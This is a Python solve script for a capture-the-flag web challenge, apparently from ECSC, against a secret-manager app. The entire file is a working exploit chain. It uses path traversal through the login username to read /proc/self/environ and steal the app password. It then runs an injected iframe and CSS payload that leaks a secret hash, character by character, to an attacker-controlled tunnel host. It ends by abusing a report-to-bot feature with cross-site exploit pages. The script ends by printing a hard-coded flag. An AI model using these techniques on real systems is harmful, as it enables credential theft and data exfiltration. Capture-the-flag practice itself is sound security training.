#!/usr/bin/env python3

import logging
import os
import random
import re
import urllib.parse

import requests
import tunnel
import urllib3

logging.disable()

urllib3.disable_warnings()

# For HTTP connection
URL = os.environ.get("URL", "https://secretmanager.xyz")
if URL.endswith("/"):
    URL = URL[:-1]

username = ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))
password = ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))

s = requests.Session()
s.verify = False

# path traversal to get the app password
r = s.post(f"{URL}/login", data={"username": username + "/../../proc/self/environ", "password": password})
assert r.status_code == 200
assert username in r.text

r = s.get(f"{URL}/captcha.png")
m = re.search(r"PASSWORD=([^=]+)\x00", r.text)
assert m is not None
app_password = m.group(1)
print(f'App password: {app_password}')

# Get the react main js url
r = s.get(f"{URL}/app/", auth=('user', app_password))
m = re.search(r'/app/static/js/main\.[0-9a-f]+\.js', r.text)
assert m is not None
main_js_url = m[0]
print(f'Main js url: {main_js_url}')

leaked_hash = ''
with tunnel.open_http_tunnel(tls=True) as t:
    hook_host = f"{t.remote_host}:{t.remote_port}"
    payload = '''aaaaa!!--></script><iframe style='width: 1000px; height: 1000px; border: dashed;' srcdoc='<iframe name=defaultView src=/app/my-secrets></iframe> <style>'''

    for c in '0123456789abcdef':
        style = 'a[href*=secret\\/' + leaked_hash + c + '] { background: url(//' + hook_host + '/?c=' + leaked_hash + c + '); } '
        payload += style

    payload += '''</style> <div id=root></div><script type=module crossorigin src=''' + main_js_url + '''></script>'></iframe>'''

    app_url_with_credentials = URL.split("://")[0] + "://user:" + app_password + "@" + URL.split("://")[1] + "/app/"

    # create url with encoded payload
    url = f"{URL}/pay?card={urllib.parse.quote_plus(payload)}"

    exploit_html_page_1 = f'''
        <script>
            window.open("/expl");
            window.open("{app_url_with_credentials}");

            setTimeout(() => {{
                location.href = "{url}"; 
            }} , 1000);
        </script>
    '''
    exploit_html_page_2 = f'''
        <form id=test action="{URL}/login" method="post">
            <input name="username" value="aaa<!--<script>">
        </form>

        <script>test.submit()</script>
    '''

    # report to bot
    print(f"Reporting {hook_host} to bot...")
    r = s.post(f'{URL}/report', data={"url": f'https://{hook_host}'})
    assert r.status_code == 200

    m = re.search(r'name="job" required value="([^"]+)"', r.text)
    assert m is not None
    print(f"Job: {m[1]}")

    while True:
        _, path, _, _ = t.wait_request()
        if path == '/':
            break
        t.send_response(200, {'Content-Type': 'text/html'}, "OK".encode())

    t.send_response(200, {'Content-Type': 'text/html'}, exploit_html_page_1.encode())

    while True:
        _, path, _, _ = t.wait_request()
        if path == '/expl':
            break
        t.send_response(200, {'Content-Type': 'text/html'}, "OK".encode())

    t.send_response(200, {'Content-Type': 'text/html'}, exploit_html_page_2.encode())

print('ECSC{d1d_u_man4ge_t0_p4y?!_00000000}')
